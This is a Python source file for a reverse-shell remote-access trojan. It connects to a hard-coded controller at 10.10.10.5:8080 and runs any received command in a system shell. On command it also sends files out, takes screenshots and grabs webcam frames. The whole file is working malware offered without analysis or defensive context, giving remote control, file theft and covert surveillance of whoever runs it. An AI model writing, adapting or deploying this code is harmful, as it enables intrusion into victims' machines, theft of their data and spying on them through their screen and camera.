import socket 
import subprocess 
import os
from PIL import ImageGrab
import cv2
       
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE'.encode())
        
    else: 
        s.send('Unable to find out the file'.encode())

def connecting():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.10.5', 8080))
 
    while True: 
        command = s.recv(1024)
        
        if 'terminate' in command.decode():
            s.close()
            break 

        elif 'download' in command.decode(): 
            grab, path = command.decode().split(" ")
            
            try: 
                transfer(s, path)
            except :
                pass

        elif 'cd' in command.decode():
            code, directory = command.decode().split(' ')
            try:
                os.chdir(directory)
                s.send(b"Your working directory is > " + os.getcwd().encode())

            except Exception as e:
                s.send(('[-] ' + str(e)).encode())

        elif 'shot' in command.decode():
            try:
                ImageGrab.grab().save("screenshot.jpg","JPEG")

            except:
                pass

        elif 'snap' in command.decode():
            try:
                webcam = cv2.VideoCapture(0) 
                check, frame = webcam.read()
                cv2.imwrite(filename=r'webcam.jpg', img=frame)
                webcam.release()
            except:
                pass

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() ) 
            s.send( CMD.stderr.read() ) 

def main ():
    connecting()
main()
